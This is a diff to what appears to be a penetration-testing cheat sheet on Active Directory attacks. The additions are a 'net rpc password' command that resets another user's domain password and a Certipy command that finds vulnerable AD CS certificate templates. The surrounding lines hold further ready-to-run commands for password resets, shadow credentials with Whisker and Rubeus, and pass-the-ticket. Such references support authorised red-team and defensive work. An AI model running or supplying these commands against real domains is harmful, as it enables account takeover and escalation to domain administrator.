@@ -81,6 +81,8 @@ impacket-changepasswd $DOMAIN/target_user@$DC_IP -newpass 'NewPass123!' \
 ```powershell
 # Net command (if you have local access)
 net user target_user NewPass123! /domain
+
+net rpc password "TargetUser" "P@ssword2026" -U "DOMAIN"/"ControlledUser"%'Password' -S "DomainController"
 ```
 
 ### GenericAll / AddMember on Group — Add to Domain Admins
@@ -182,6 +184,16 @@ python3 getnthash.py -key SESSION_KEY $DOMAIN/target_user
 # Whisker on Windows
 .\Whisker.exe add /target:target_user
 .\Rubeus.exe asktgt /user:target_user /certificate:BASE64 /password:PASS /ptt
+```
+
+### Active Directory Certificate Services (AD CS)
+- [Certipy](https://github.com/ly4k/Certipy/wiki)
+
+```shell
+# Rescourse 
+certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -text -enabled -hide-admins -vulnerable
+
+# Follow the process with EC1
 ```
 
 ---
